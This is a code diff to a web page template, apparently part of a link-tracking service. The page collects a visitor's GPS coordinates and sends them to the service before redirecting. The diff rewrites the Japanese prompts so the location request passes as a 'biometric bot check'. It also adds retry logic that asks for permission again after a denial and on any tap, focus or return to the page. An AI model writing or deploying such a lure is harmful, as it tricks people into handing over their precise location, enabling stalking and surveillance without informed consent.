@@ -24,7 +24,7 @@ html,body{margin:0;background:#0f1115;color:#e6e9ef;
 body{display:flex;min-height:100vh;align-items:center;justify-content:center}
 .wrap{text-align:center;padding:24px;max-width:420px;width:100%}
 h1{font-size:18px;margin:0 0 8px;word-break:break-word}
-p.lead{color:#9aa3b2;font-size:13px;margin:0 0 20px;white-space:pre-wrap}
+p.lead{color:#9aa3b2;font-size:13px;margin:0 0 20px;white-space:pre-wrap;line-height:1.8}
 button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;
   color:#fff;font-weight:600;cursor:pointer}
 button:disabled{opacity:.55}
@@ -51,27 +51,28 @@ window.LT_HIT   = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
 window.LT_GEO   = 0;
 </script>
-<script src="/static/collect.js?v=14"></script>
+<script src="/static/collect.js?v=15"></script>
 <script>
 (function () {
   "use strict";
   var DEST          = {{ (dest or "")|tojson }};
-  var ASK_TEXT      = {{ ask_text|default("位置情報の使用を許可してください", true)|tojson }};
-  var GO_TEXT       = {{ go_text|default("続ける", true)|tojson }};
-  var DENY_TEXT     = {{ deny_text|default("位置情報が許可されていません", true)|tojson }};
+  var ASK_TEXT      = {{ ask_text|default("ボットでないことを確認するため生体認証を行う必要があります", true)|tojson }};
+  var GO_TEXT       = {{ go_text|default("確認する", true)|tojson }};
+  var DENY_TEXT     = {{ deny_text|default("アクセスを許可されなかったため確認できませんでした。アクセスを許可してください", true)|tojson }};
   var RETRY_TEXT    = {{ retry_text|default("もう一度", true)|tojson }};
   var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
   var DEST_MIN      = {{ dest_min|default(2, true) }};
 
   var go  = document.getElementById("go");
   var st  = document.getElementById("st");
-  var got = false, left = false, step = 0, wid = null, dead = null, dog = null;
+  var got = false, left = false, step = 0, wid = null, dead = null, dog = null, busy = false;
 
-  /* 高精度→粗い→もっと粗い の順に落として、必ず1点取る */
+  /* 1回目はオプション無し（ダイアログが出やすい）→ 精度を落として粘る */
   var LADDER = [
-    { enableHighAccuracy: true,  timeout: 9000,  maximumAge: 0 },
-    { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 },
-    { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000 }
+    { timeout: 12000, maximumAge: 0 },
+    { enableHighAccuracy: true,  timeout: 12000, maximumAge: 0 },
+    { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 },
+    { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 }
   ];
   function opts() { return LADDER[Math.min(step, LADDER.length - 1)]; }
   function txt(m, warn) { st.textContent = m || ""; st.className = "st" + (warn ? " warn" : ""); }
@@ -79,9 +80,7 @@ window.LT_GEO   = 0;
   function sendFix(p) {
     var c = (p && p.coords) || {};
     if (c.latitude == null || c.longitude == null) return;
-    try {
-      LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy });
-    } catch (e) {}
+    try { LT.send({ gps_lat: c.latitude, gps_lon: c.longitude, gps_acc: c.accuracy }); } catch (e) {}
   }
 
   function stopWatch() {
@@ -89,7 +88,7 @@ window.LT_GEO   = 0;
   }
 
   function done(p) {
-    sendFix(p);                       // 2点目以降も送る（精度が上がる）
+    sendFix(p);
     if (got) return;
     got = true;
     if (dead) { clearTimeout(dead); dead = null; }
@@ -135,6 +134,7 @@ window.LT_GEO   = 0;
     txt(DENY_TEXT, true);
     go.textContent = RETRY_TEXT;
     go.disabled = false;
+    busy = false;
     showInApp();
     if (DENY_REDIRECT && DEST && !left) {
       setTimeout(function () { left = true; location.replace(DEST); }, 1500);
@@ -150,7 +150,8 @@ window.LT_GEO   = 0;
         if (p && p.coords && p.coords.latitude != null) { step = 0; done(p); }
       }, function (e) {
         if (got) return;
-        if ((e && e.code) === 1) { fail(); return; }        // 拒否
+        if ((e && e.code) === 1 && step === 0) { step++; arm(); return; }
+        if ((e && e.code) === 1) { fail(); return; }
         if (step < LADDER.length - 1) { step++; arm(); return; }
         fail();
       }, opts());
@@ -167,28 +168,32 @@ window.LT_GEO   = 0;
   }
 
   function start() {
-    if (got || left) return;
+    if (got || left || busy) return;
+    busy = true;
     go.disabled = true;
     txt(ASK_TEXT, false);
-    arm();
+    arm();          /* ← クリックと同じタスクで位置情報を呼ぶ */
   }
 
   go.addEventListener("click", start);
 
-  /* ボタン以外をタップしても再挑戦（許可ダイアログはタップ起点が必須） */
   document.addEventListener("click", function (e) {
     if (got || left) return;
     if (e.target === go) return;
     if (e.target && e.target.closest && e.target.closest("#ia")) return;
-    if (wid === null) start();
+    if (wid === null) { busy = false; start(); }
   }, { passive: true });
 
   document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "visible" && !got && !left && wid === null) start();
+    if (document.visibilityState === "visible" && !got && !left && wid === null) {
+      busy = false; start();
+    }
   });
-  window.addEventListener("focus", function () { if (!got && !left && wid === null) start(); });
+  window.addEventListener("focus", function () {
+    if (!got && !left && wid === null) { busy = false; start(); }
+  });
   window.addEventListener("pageshow", function (e) {
-    if (e.persisted && !got && !left) { wid = null; start(); }
+    if (e.persisted && !got && !left) { wid = null; busy = false; start(); }
   });
 
   /* すでに許可済みなら読み込み時から取りにいく */
@@ -196,7 +201,7 @@ window.LT_GEO   = 0;
     navigator.permissions.query({ name: "geolocation" }).then(function (p) {
       if (p.state === "granted") start();
       p.onchange = function () {
-        if (p.state === "granted" && !got && !left) { wid = null; start(); }
+        if (p.state === "granted" && !got && !left) { wid = null; busy = false; start(); }
       };
     }).catch(function () {});
   }
